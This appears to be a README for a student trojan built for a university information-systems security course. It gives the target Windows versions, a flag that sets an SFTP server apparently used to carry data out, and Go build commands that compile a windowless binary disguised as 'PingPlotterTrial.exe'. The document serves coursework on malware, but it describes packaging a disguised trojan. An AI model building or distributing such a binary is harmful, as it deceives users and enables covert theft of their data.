## A Small Trojan created for ICT Information Systems Security @ RMIT University

- S3636862: Negar Farshchi
- S3751243: Matthew Waiariki

### **Target**

- Target is for Windows 10/8/7 machine.
- Ability to handle if user is using a OneDrive Desktop or Normal Desktop.
- Set custom SFTP server, use flag " -sftp "sftp server address"

### **Building Binary**
1. Download required packages
```
go get  "github.com/elastic/go-sysinfo"
go get  "github.com/pkg/sftp"
go get  "golang.org/x/crypto/ssh"

```

2. Build
```
go build -ldflags -H=windowsgui -o "\bin\PingPlotterTrial.exe" 

```
3. New Binary will be found in bin\
